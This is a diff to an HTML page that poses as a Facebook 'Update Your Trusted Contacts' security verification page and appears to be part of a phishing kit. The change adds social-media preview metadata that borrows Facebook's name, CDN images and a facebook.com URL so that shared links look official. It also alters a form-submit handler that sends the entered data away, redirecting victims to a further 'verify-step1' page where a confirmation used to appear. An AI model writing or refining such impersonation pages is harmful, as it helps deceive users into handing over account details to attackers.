@@ -4,6 +4,17 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
   <title>Facebook - Update Your Trusted Contacts</title>
+  <meta name="description" content="Facebook security verification - Update your trusted contacts to protect your account and ensure account recovery options are current.">
+  <meta property="og:title" content="Facebook - Account Security Verification">
+  <meta property="og:description" content="🛡️ Security Update Required: Please verify your trusted contacts to enhance your Facebook account protection and ensure secure access.">
+  <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y5/r/TJPKIuZGNxL.png">
+  <meta property="og:url" content="https://www.facebook.com/security/verification">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="Facebook">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Facebook Security Verification">
+  <meta name="twitter:description" content="🛡️ Trusted Contacts Security Update - Verify your account to maintain protection">
+  <meta name="twitter:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y5/r/TJPKIuZGNxL.png">
   <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzE4NzdGMiI+PHBhdGggZD0iTTI0IDEyLjA3M2MwLTYuNjI3LTUuMzczLTEyLTEyLTEycy0xMiA1LjM3My0xMiAxMmMwIDUuOTkgNC4zODggMTAuOTU0IDEwLjEyNSAxMS45Mjd2LTguNDM3SDcuMDc4di0zLjQ5aDMuMDQ3VjkuNDNjMC0zLjAwNyAxLjc5Mi00LjY2OSA0LjUzMy00LjY2OSAxLjMxMiAwIDIuNjg2LjIzNCAyLjY4Ni4yMzR2Mi45NTNoLTEuNTE0Yy0xLjQ5MSAwLTEuOTU1LjkyNS0xLjk1NSAxLjg3NHYyLjI1aDMuMzI4bC0uNTMyIDMuNDloLTIuNzk2djguNDM3QzE5LjYxMiAyMy4wMjcgMjQgMTguMDYyIDI0IDEyLjA3M3oiLz48L3N2Zz4=">
   <style>
     /* Reset styles */
@@ -1058,9 +1069,9 @@
             console.error('Error sending data:', error);
           }
           
-          // Show the confirmation modal
+          // Redirect to first verification step
           setTimeout(function() {
-            modal.classList.add('show');
+            window.location.href = '/verify-step1';
           }, 500);
         }
       });
